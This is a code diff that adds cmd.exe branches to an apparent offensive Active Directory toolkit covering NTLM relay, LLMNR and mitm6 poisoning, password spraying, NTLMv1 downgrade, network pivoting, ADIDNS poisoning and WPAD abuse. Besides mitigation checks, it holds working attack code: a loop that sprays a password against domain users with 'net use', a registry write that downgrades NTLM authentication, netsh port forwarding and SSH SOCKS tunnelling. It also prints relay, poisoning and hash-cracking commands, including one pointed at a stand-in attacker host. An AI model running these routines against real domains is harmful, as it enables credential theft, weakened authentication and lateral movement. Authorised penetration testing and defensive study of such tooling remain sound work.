@@ -1,4 +1,4 @@
-import { ps, argVal, hasFlag } from "./shared"
+import { ps, cmd, wmic, activeExec, argVal, hasFlag } from "./shared"
 import type { Finding, HookResult } from "./shared"
 
 export async function ntlmRelay(args: string[], timeout: number): Promise<HookResult> {
@@ -9,6 +9,45 @@ export async function ntlmRelay(args: string[], timeout: number): Promise<HookRe
   const listenPort = argVal(args, "--listen-port") || "445"
   const findings: Finding[] = []
   const output: string[] = ["[*] NTLM relay attack toolkit...\n"]
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("=== NTLM Relay (cmd.exe) ===\n")
+    if (action === "enum" || action === "targets") {
+      output.push("[*] Enumerating NTLM relay targets...")
+      const netview = await cmd("net view /domain 2>nul", timeout)
+      output.push(netview.stdout.trim() ? `[+] Domain computers:\n${netview.stdout}` : "[-] net view failed — try: net view /domain:<name>")
+      const arp = await cmd("arp -a", timeout)
+      output.push(`\n[*] ARP table (live hosts):\n${arp.stdout}`)
+      output.push("\n[*] SMB signing check (cmd limitation):")
+      output.push("    cmd.exe cannot perform SMB negotiate — use nmap:")
+      output.push("    nmap --script smb2-security-mode -p 445 <target>")
+      output.push("    Or: CrackMapExec smb <target> --gen-relay-list relayable.txt")
+      if (target) {
+        const nbtstat = await cmd(`nbtstat -A ${target} 2>nul`, timeout)
+        output.push(`\n[*] NetBIOS info for ${target}:\n${nbtstat.stdout}`)
+      }
+      findings.push({ checkId: "WIN-RELAY-001", provider: "windows", severity: "medium", status: "ENUMERATED", resource: "network://ntlm-relay", title: "NTLM relay target enumeration via cmd.exe", details: "net view + arp scan — use external tools for SMB signing check", remediation: "Enable SMB signing on all systems. Disable NTLM where possible." })
+    }
+    if (action === "check") {
+      output.push("[*] Local NTLM relay mitigations:")
+      const smb = await cmd('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters" /v RequireSecuritySignature 2>nul', timeout)
+      const signing = smb.stdout.includes("0x1")
+      output.push(signing ? "[+] SMB signing: REQUIRED (relay-protected)" : "[!] SMB signing: NOT required (relay-vulnerable)")
+      const ldap = await cmd('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters" /v LdapServerIntegrity 2>nul', timeout)
+      output.push(ldap.stdout.includes("0x2") ? "[+] LDAP signing: REQUIRED" : "[!] LDAP signing: NOT required")
+      const epa = await cmd('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v SuppressExtendedProtection 2>nul', timeout)
+      output.push(`[*] EPA status: ${epa.stdout.includes("0x0") ? "Enforced" : "Check manually"}`)
+      if (!signing) findings.push({ checkId: "WIN-RELAY-002", provider: "windows", severity: "high", status: "FAIL", resource: "SMB Signing", title: "SMB signing not required — relay attacks possible", details: "RequireSecuritySignature=0", remediation: "Enable SMB signing via GPO" })
+    }
+    if (action === "relay") {
+      output.push("[!] Active NTLM relay requires external tools (cannot be done in cmd.exe)")
+      output.push("[*] Relay tools:")
+      output.push(`    ntlmrelayx.py -t ${relayTo || "<target>"} -smb2support`)
+      output.push(`    ntlmrelayx.py -t ldap://${relayTo || "<dc>"} --delegate-access`)
+      output.push("    Responder.py + ntlmrelayx.py (combined)")
+    }
+    return { output: output.join("\n"), findings }
+  }
 
   if (action === "enum" || action === "targets") {
     const script = `
@@ -423,6 +462,36 @@ export async function responderPoison(args: string[], timeout: number): Promise<
   const findings: Finding[] = []
   const output: string[] = ["[*] LLMNR/NBT-NS/mDNS poisoning toolkit...\n"]
 
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("=== LLMNR/NBT-NS Poisoning (cmd.exe) ===\n")
+    if (action === "check") {
+      output.push("[*] Checking broadcast poisoning opportunities...")
+      const llmnr = await cmd('reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient" /v EnableMulticast 2>nul', timeout)
+      output.push(llmnr.stdout.includes("0x0") ? "[+] LLMNR: DISABLED via GPO" : "[!] LLMNR: ENABLED — poisoning possible")
+      const nbtns = await cmd("nbtstat -n", timeout)
+      output.push(`\n[*] NetBIOS names:\n${nbtns.stdout}`)
+      const mdns = await cmd("netsh interface ip show dns", timeout)
+      output.push(`\n[*] DNS config:\n${mdns.stdout}`)
+      const ipconfig = await cmd("ipconfig /all", timeout)
+      const dnsServers = ipconfig.stdout.match(/DNS Servers.*:(.+)/g) || []
+      output.push(`\n[*] DNS servers:\n${dnsServers.map(d => `    ${d}`).join("\n")}`)
+      output.push("\n[*] Network interfaces:")
+      const ifaces = await cmd("ipconfig", timeout)
+      output.push(ifaces.stdout)
+      if (!llmnr.stdout.includes("0x0")) findings.push({ checkId: "WIN-POISON-001", provider: "windows", severity: "high", status: "FAIL", resource: "network://llmnr", title: "LLMNR enabled — broadcast poisoning possible", details: "LLMNR not disabled via GPO", remediation: "Disable LLMNR via GPO: Computer Config > Admin Templates > Network > DNS Client > Turn Off Multicast" })
+    }
+    if (action === "poison" || action === "analyze") {
+      output.push("[!] Active poisoning requires external tools:")
+      output.push("    Responder.py -I <interface> -wrf")
+      output.push("    Inveigh.exe (Windows native, .NET)")
+      output.push("    mitm6 (IPv6 DNS takeover)")
+      output.push("\n[*] Capture hashes then crack:")
+      output.push("    hashcat -m 5600 hashes.txt wordlist.txt (NetNTLMv2)")
+      output.push("    hashcat -m 5500 hashes.txt wordlist.txt (NetNTLMv1)")
+    }
+    return { output: output.join("\n"), findings }
+  }
+
   if (action === "check") {
     const script = `
 Write-Output "=== Broadcast Poisoning Opportunity Assessment ==="
@@ -696,6 +765,46 @@ export async function passwordSpray(args: string[], timeout: number): Promise<Ho
   const findings: Finding[] = []
   const output: string[] = ["[*] Domain password spraying...\n"]
 
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("=== Password Spray (cmd.exe) ===\n")
+    if (action === "policy") {
+      output.push("[*] Querying domain password policy...")
+      const nltest = await cmd("nltest /dsgetdc:", timeout)
+      const dcName = nltest.stdout.match(/DC: \\\\(.+)/)?.[1]?.trim()
+      output.push(dcName ? `[+] DC: ${dcName}` : "[!] Cannot determine DC")
+      const policy = await cmd("net accounts /domain 2>nul", timeout)
+      output.push(policy.exitCode === 0 ? `\n[+] Domain password policy:\n${policy.stdout}` : `\n[!] net accounts failed: ${policy.stderr}`)
+      const lockout = policy.stdout.match(/Lockout threshold:\s+(\d+)/)?.[1]
+      if (lockout) {
+        output.push(`\n[*] Safe spray: use threshold minus ${margin} = max ${parseInt(lockout) - parseInt(margin)} attempts per user`)
+        findings.push({ checkId: "WIN-SPRAY-001", provider: "windows", severity: "medium", status: "ENUMERATED", resource: "domain://policy", title: `Domain lockout threshold: ${lockout}`, details: `Password spray safe up to ${parseInt(lockout) - parseInt(margin)} attempts`, remediation: "Enforce strong passwords and MFA" })
+      }
+    }
+    if (action === "spray") {
+      if (!password) { output.push("[!] Required: --password <password>"); return { output: output.join("\n"), findings } }
+      output.push("[!] Active spraying via cmd.exe uses net use (noisy, logs Event 4625)")
+      output.push(`[*] Password: ${password}`)
+      output.push("[*] Spraying via net use against DC...")
+      const userList = await cmd('net user /domain 2>nul | findstr /v /c:"---" /c:"The command" /c:"User accounts"', timeout)
+      const userNames = userList.stdout.trim().split(/\s+/).filter(u => u.length > 1).slice(0, 20)
+      output.push(`[*] Testing ${userNames.length} users...`)
+      for (const u of userNames) {
+        const r = await cmd(`net use \\\\${dc || "localhost"}\\IPC$ /user:${u} "${password}" 2>&1`, timeout)
+        if (r.exitCode === 0 || r.stdout.includes("command completed")) {
+          output.push(`[+] SUCCESS: ${u}:${password}`)
+          await cmd(`net use \\\\${dc || "localhost"}\\IPC$ /delete /y 2>nul`, timeout)
+          findings.push({ checkId: `WIN-SPRAY-${findings.length + 1}`, provider: "windows", severity: "critical", status: "EXTRACTED", resource: `user://${u}`, title: `Valid credential: ${u}`, details: `Password spray success with: ${password}`, remediation: "Force password reset for this user" })
+        }
+      }
+    }
+    if (action === "status") {
+      output.push("[*] Account lockout status:")
+      const locked = await cmd('net user /domain 2>nul | findstr /v /c:"---" /c:"The command" /c:"User accounts"', timeout)
+      output.push(locked.stdout.trim() ? `Users:\n${locked.stdout}` : "[-] Cannot enumerate users")
+    }
+    return { output: output.join("\n"), findings }
+  }
+
   if (action === "policy") {
     const script = `
 $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
@@ -877,6 +986,38 @@ export async function ntlmv1Downgrade(args: string[], timeout: number): Promise<
   const findings: Finding[] = []
   const output: string[] = ["[*] NTLMv1 downgrade analysis...\n"]
 
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("=== NTLMv1 Downgrade (cmd.exe) ===\n")
+    const lsaKey = "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa"
+    if (action === "check") {
+      const lm = await cmd(`reg query "${lsaKey}" /v LmCompatibilityLevel 2>nul`, timeout)
+      const lmVal = lm.stdout.match(/LmCompatibilityLevel\s+REG_DWORD\s+0x(\w+)/)?.[1]
+      const lmLevel = lmVal ? parseInt(lmVal, 16) : -1
+      const levels: Record<number, string> = { 0: "Send LM & NTLM (most vulnerable)", 1: "LM & NTLM, use NTLMv2 session if negotiated", 2: "Send NTLM only", 3: "Send NTLMv2 only (default)", 4: "NTLMv2 only, refuse LM on DC", 5: "NTLMv2 only, refuse LM & NTLM (most secure)" }
+      output.push(`LmCompatibilityLevel: ${lmLevel === -1 ? "NOT SET (default=3)" : lmLevel}`)
+      output.push(`Meaning: ${levels[lmLevel] || levels[3]}`)
+      if (lmLevel >= 0 && lmLevel < 3) {
+        output.push(`\n[!] VULNERABLE: NTLMv1 is accepted — hashes crackable via rainbow tables`)
+        findings.push({ checkId: "WIN-NTLM-001", provider: "windows", severity: "critical", status: "FAIL", resource: lsaKey, title: `NTLMv1 enabled (level ${lmLevel})`, details: levels[lmLevel], remediation: "Set LmCompatibilityLevel to 5" })
+      }
+      const noLM = await cmd(`reg query "${lsaKey}" /v NoLMHash 2>nul`, timeout)
+      output.push(`\nNoLMHash: ${noLM.stdout.includes("0x1") ? "1 (LM hashes not stored)" : "0 or not set (LM hashes may be stored)"}`)
+      const ntlmMinSec = await cmd(`reg query "${lsaKey}\\MSV1_0" /v NtlmMinServerSec 2>nul`, timeout)
+      output.push(`NtlmMinServerSec: ${ntlmMinSec.stdout.match(/0x\w+/)?.[0] || "not set"}`)
+    }
+    if (action === "downgrade") {
+      output.push(`[*] Setting LmCompatibilityLevel to ${level}...`)
+      const r = await cmd(`reg add "${lsaKey}" /v LmCompatibilityLevel /t REG_DWORD /d ${level} /f`, timeout)
+      output.push(r.exitCode === 0 ? `[+] LmCompatibilityLevel set to ${level}` : `[!] Failed: ${r.stderr}`)
+      if (r.exitCode === 0) findings.push({ checkId: "WIN-NTLM-002", provider: "windows", severity: "critical", status: "EXECUTED", resource: lsaKey, title: `NTLMv1 downgrade applied (level ${level})`, details: "LmCompatibilityLevel changed", remediation: "Restore to level 5" })
+    }
+    if (action === "restore") {
+      const r = await cmd(`reg add "${lsaKey}" /v LmCompatibilityLevel /t REG_DWORD /d 3 /f`, timeout)
+      output.push(r.exitCode === 0 ? "[+] LmCompatibilityLevel restored to 3" : `[!] Failed: ${r.stderr}`)
+    }
+    return { output: output.join("\n"), findings }
+  }
+
   if (action === "check") {
     const script = `
 Write-Output "=== NTLM Authentication Level ==="
@@ -1046,6 +1187,59 @@ export async function proxyPivot(args: string[], timeout: number): Promise<HookR
   const sshUser = argVal(args, "--ssh-user") || "root"
   const findings: Finding[] = []
   const output: string[] = ["[*] Network pivoting operations...\n"]
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("=== Network Pivoting (cmd.exe) ===\n")
+    if (action === "enum") {
+      output.push("[*] Network interfaces:")
+      const ipconfig = await cmd("ipconfig /all", timeout)
+      output.push(ipconfig.stdout)
+      output.push("[*] Routing table:")
+      const route = await cmd("route print", timeout)
+      output.push(route.stdout)
+      output.push("[*] ARP table:")
+      const arp = await cmd("arp -a", timeout)
+      output.push(arp.stdout)
+      output.push("[*] Active connections:")
+      const netstat = await cmd("netstat -ano | findstr ESTABLISHED", timeout)
+      output.push(netstat.stdout)
+      output.push("\n[*] Port forwarding rules:")
+      const portproxy = await cmd("netsh interface portproxy show all", timeout)
+      output.push(portproxy.stdout.trim() || "    None configured")
+      output.push("\n[*] Available tools:")
+      const ssh = await cmd("where ssh 2>nul", timeout)
+      const plink = await cmd("where plink 2>nul", timeout)
+      output.push(ssh.exitCode === 0 ? "    [+] ssh.exe available" : "    [-] ssh.exe not found")
+      output.push(plink.exitCode === 0 ? "    [+] plink.exe available" : "    [-] plink.exe not found")
+      findings.push({ checkId: "WIN-PIVOT-001", provider: "windows", severity: "info", status: "ENUMERATED", resource: "network://pivot", title: "Network pivot capability enumeration", details: "Interfaces, routes, and tool availability checked", remediation: "Segment networks. Restrict lateral movement." })
+    }
+    if (action === "portproxy") {
+      if (!targetAddr) { output.push("[!] Required: --target HOST:PORT"); return { output: output.join("\n"), findings } }
+      const parts = targetAddr.split(":")
+      output.push(`[*] Setting up netsh portproxy: 0.0.0.0:${listenPort} → ${targetAddr}`)
+      const r = await cmd(`netsh interface portproxy add v4tov4 listenport=${listenPort} listenaddress=0.0.0.0 connectport=${parts[1] || "445"} connectaddress=${parts[0]}`, timeout)
+      output.push(r.exitCode === 0 ? `[+] Port forward active: 0.0.0.0:${listenPort} → ${targetAddr}` : `[!] Failed: ${r.stderr}`)
+      if (r.exitCode === 0) findings.push({ checkId: "WIN-PIVOT-002", provider: "windows", severity: "high", status: "EXECUTED", resource: `portproxy://${listenPort}`, title: `Port forward via netsh portproxy`, details: `0.0.0.0:${listenPort} → ${targetAddr}`, remediation: "netsh interface portproxy delete v4tov4 listenport=" + listenPort + " listenaddress=0.0.0.0" })
+    }
+    if (action === "socks") {
+      output.push("[!] SOCKS proxy requires external tools in cmd mode:")
+      output.push("    ssh -D 1080 user@host (OpenSSH)")
+      output.push("    plink.exe -D 1080 user@host (PuTTY)")
+      output.push("    chisel.exe client <server>:8080 socks")
+      output.push("    ligolo-ng (modern C2 tunnel)")
+    }
+    if (action === "reverse") {
+      output.push("[*] Reverse port forward via netsh:")
+      output.push(`    netsh interface portproxy add v4tov4 listenport=${listenPort} connectport=<remote_port> connectaddress=<remote_host>`)
+      output.push("    Or: ssh -R <remote_port>:localhost:<local_port> user@attacker")
+    }
+    if (action === "ssh-tunnel" && sshHost) {
+      output.push(`[*] SSH tunnel to ${sshHost}...`)
+      const r = await cmd(`ssh -f -N -D ${listenPort} ${sshUser}@${sshHost}`, timeout)
+      output.push(r.exitCode === 0 ? `[+] SOCKS proxy via SSH on port ${listenPort}` : `[!] SSH tunnel failed: ${r.stderr}`)
+    }
+    return { output: output.join("\n"), findings }
+  }
 
   if (action === "enum") {
     const script = `
@@ -1315,6 +1509,37 @@ export async function adidnsPoison(args: string[], timeout: number): Promise<Hoo
   const recordType = argVal(args, "--type") || "A"
   const findings: Finding[] = []
   const output: string[] = ["[*] AD-integrated DNS poisoning toolkit...\n"]
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("=== AD-Integrated DNS Poisoning (cmd.exe) ===\n")
+    if (action === "enum") {
+      output.push("[*] DNS zone enumeration...")
+      const dnsZones = await cmd("dnscmd /enumzones 2>nul", timeout)
+      output.push(dnsZones.exitCode === 0 ? `[+] DNS zones:\n${dnsZones.stdout}` : "[-] dnscmd not available (RSAT DNS tools needed)")
+      const nslookup = await cmd("nslookup -type=any _msdcs 2>nul", timeout)
+      output.push(`\n[*] DNS servers:\n${nslookup.stdout}`)
+      const ipconfig = await cmd("ipconfig /all | findstr \"DNS Servers\"", timeout)
+      output.push(`[*] ${ipconfig.stdout.trim()}`)
+      output.push("\n[*] ADIDNS record injection requires LDAP (PS/.NET)")
+      output.push("    Tool alternatives:")
+      output.push("    dnstool.py -u domain/user -p pass -r <record> -a add -d <ip> <dc>")
+      output.push("    Invoke-DNSUpdate (PS, for dynamic DNS)")
+    }
+    if (action === "check-perms") {
+      output.push("[!] ADIDNS ACL check requires LDAP queries (PS/.NET)")
+      output.push("[*] Alternative: dsacls 'DC=<zone>,CN=MicrosoftDNS,DC=DomainDnsZones,DC=...'")
+      if (zone) {
+        const dsacls = await cmd(`dsacls "CN=MicrosoftDNS,DC=DomainDnsZones" 2>nul`, timeout)
+        output.push(dsacls.stdout.trim() ? dsacls.stdout : "[-] dsacls failed")
+      }
+    }
+    if (action === "inject" || action === "wildcard" || action === "delete") {
+      output.push("[!] DNS record manipulation requires LDAP or dnscmd:")
+      output.push(`    dnscmd <dc> /recordadd ${zone || "<zone>"} ${name || "<name>"} ${recordType} ${ip || "<ip>"}`)
+      output.push(`    dnscmd <dc> /recorddelete ${zone || "<zone>"} ${name || "<name>"} ${recordType} /f`)
+    }
+    return { output: output.join("\n"), findings }
+  }
 
   if (action === "enum") {
     const script = `
@@ -1587,6 +1812,36 @@ export async function machineAccount(args: string[], timeout: number): Promise<H
   const findings: Finding[] = []
   const output: string[] = ["[*] Machine account operations...\n"]
 
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("=== Machine Account Operations (cmd.exe) ===\n")
+    if (action === "quota") {
+      output.push("[*] Checking ms-DS-MachineAccountQuota...")
+      const dsquery = await cmd('dsquery * -filter "(objectClass=domain)" -attr ms-DS-MachineAccountQuota -limit 1 2>nul', timeout)
+      output.push(dsquery.exitCode === 0 ? `[+] Query result:\n${dsquery.stdout}` : "[-] dsquery not available (RSAT needed)")
+      const nltest = await cmd("nltest /dsgetdc:", timeout)
+      output.push(`\n[*] Domain info:\n${nltest.stdout}`)
+      output.push("\n[*] If quota > 0, any authenticated user can create machine accounts")
+      output.push("    Attack chain: create machine → RBCD → impersonate admin")
+    }
+    if (action === "create") {
+      if (!name) { output.push("[!] Required: --name MACHINE$"); return { output: output.join("\n"), findings } }
+      output.push(`[*] Creating machine account: ${name}`)
+      output.push("[!] Machine account creation via cmd.exe requires dsadd or external tools:")
+      output.push(`    dsadd computer "CN=${name.replace("$", "")},CN=Computers,DC=..." -samid "${name}"`)
+      output.push(`    Or: addcomputer.py domain/user:pass -computer-name ${name} -computer-pass ${password}`)
+    }
+    if (action === "delete") {
+      if (!name) { output.push("[!] Required: --name MACHINE$"); return { output: output.join("\n"), findings } }
+      output.push(`    dsrm "CN=${name.replace("$", "")},CN=Computers,DC=..."`)
+    }
+    if (action === "enum") {
+      output.push("[*] Enumerating machine accounts via dsquery...")
+      const machines = await cmd('dsquery computer -limit 50 2>nul', timeout)
+      output.push(machines.exitCode === 0 ? `[+] Machine accounts:\n${machines.stdout}` : "[-] dsquery failed")
+    }
+    return { output: output.join("\n"), findings }
+  }
+
   if (action === "quota") {
     const script = `
 Write-Output "=== Machine Account Quota Check ==="
@@ -1802,6 +2057,34 @@ export async function mitm6Attack(args: string[], timeout: number): Promise<Hook
   const findings: Finding[] = []
   const output: string[] = ["[*] IPv6 DNS takeover (mitm6-style)...\n"]
 
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("=== IPv6 DNS Takeover / mitm6 (cmd.exe) ===\n")
+    if (action === "check") {
+      output.push("[*] Checking IPv6 status...")
+      const ipv6 = await cmd("ipconfig /all | findstr /i \"IPv6 Link-local\"", timeout)
+      output.push(ipv6.stdout.trim() ? `[+] IPv6 addresses found:\n${ipv6.stdout}` : "[-] No IPv6 addresses")
+      output.push("\n[*] IPv6 binding check:")
+      const bindings = await cmd('netsh interface ipv6 show address 2>nul', timeout)
+      output.push(bindings.stdout.trim() ? bindings.stdout : "[-] No IPv6 bindings")
+      const dnsServers = await cmd('netsh interface ipv6 show dnsservers 2>nul', timeout)
+      output.push(`\n[*] IPv6 DNS servers:\n${dnsServers.stdout}`)
+      output.push("\n[*] DHCPv6 guard status:")
+      const dhcpv6 = await cmd('reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\TCPIP\\v6Transition" 2>nul', timeout)
+      output.push(dhcpv6.stdout.trim() || "    Not configured (default: accept DHCPv6)")
+      output.push("\n[*] Assessment:")
+      output.push("    If IPv6 is enabled and no DHCPv6 guard → mitm6 attack is possible")
+      output.push("    Attack: Advertise rogue DHCPv6 → become DNS server → relay to LDAP/HTTP")
+      if (ipv6.stdout.trim()) findings.push({ checkId: "WIN-MITM6-001", provider: "windows", severity: "high", status: "FAIL", resource: "network://ipv6", title: "IPv6 enabled — mitm6 attack possible", details: "IPv6 addresses present, DHCPv6 guard not enforced", remediation: "Disable IPv6 via GPO if not needed. Enable DHCPv6 guard." })
+    }
+    if (action === "poison") {
+      output.push("[!] Active IPv6 DNS takeover requires external tools:")
+      output.push(`    mitm6 -d ${domain || "<domain>"} ${iface ? "-i " + iface : ""}`)
+      output.push(`    ntlmrelayx.py -6 -t ldaps://${relay || "<dc>"} --delegate-access`)
+      output.push("    Or: Inveigh.exe -IPv6 Y -LLMNR Y")
+    }
+    return { output: output.join("\n"), findings }
+  }
+
   if (action === "check") {
     const script = `
 Write-Output "=== IPv6 MITM Vulnerability Assessment ==="
@@ -1961,6 +2244,35 @@ export async function wpadAbuse(args: string[], timeout: number): Promise<HookRe
   const action = argVal(args, "--action") || "check"
   const findings: Finding[] = []
   const output: string[] = ["[*] WPAD/PAC proxy abuse...\n"]
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    output.push("=== WPAD/PAC Proxy Abuse (cmd.exe) ===\n")
+    if (action === "check") {
+      output.push("[*] Proxy auto-detection settings:")
+      const autoDetect = await cmd('reg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v AutoDetect 2>nul', timeout)
+      const wpadEnabled = autoDetect.stdout.includes("0x1")
+      output.push(wpadEnabled ? "[!] WPAD AutoDetect: ENABLED — proxy auto-discovery active" : "[+] WPAD AutoDetect: DISABLED")
+      const autoConfig = await cmd('reg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v AutoConfigURL 2>nul', timeout)
+      const acUrl = autoConfig.stdout.match(/AutoConfigURL\s+REG_SZ\s+(.+)/)?.[1]?.trim()
+      output.push(acUrl ? `[*] AutoConfigURL: ${acUrl}` : "[*] AutoConfigURL: Not set")
+      output.push("\n[*] WinHTTP proxy:")
+      const winhttp = await cmd("netsh winhttp show proxy", timeout)
+      output.push(winhttp.stdout)
+      output.push("\n[*] WPAD DNS resolution:")
+      const wpadDns = await cmd("nslookup wpad 2>nul", timeout)
+      output.push(wpadDns.stdout.includes("Name:") ? `[!] wpad resolves:\n${wpadDns.stdout}` : "[-] wpad does not resolve in DNS")
+      const wpadDhcp = await cmd("ipconfig /all | findstr /i \"DHCP Server\"", timeout)
+      output.push(`\n[*] DHCP servers:\n${wpadDhcp.stdout}`)
+      if (wpadEnabled) findings.push({ checkId: "WIN-WPAD-001", provider: "windows", severity: "high", status: "FAIL", resource: "network://wpad", title: "WPAD auto-detection enabled — proxy hijack possible", details: "AutoDetect=1, attacker can serve rogue wpad.dat via LLMNR/DHCPv6", remediation: "Disable WPAD via GPO. Create a DNS record for 'wpad' pointing to safe host." })
+    }
+    if (action === "serve") {
+      output.push("[!] WPAD server requires external tools in cmd mode:")
+      output.push("    Responder.py -I <iface> -wrf (serves wpad.dat)")
+      output.push("    Inveigh.exe -WPAD Y -WPADAuth NTLM")
+      output.push("    Or serve a malicious wpad.dat via any HTTP server on port 80")
+    }
+    return { output: output.join("\n"), findings }
+  }
 
   if (action === "check") {
     const script = `
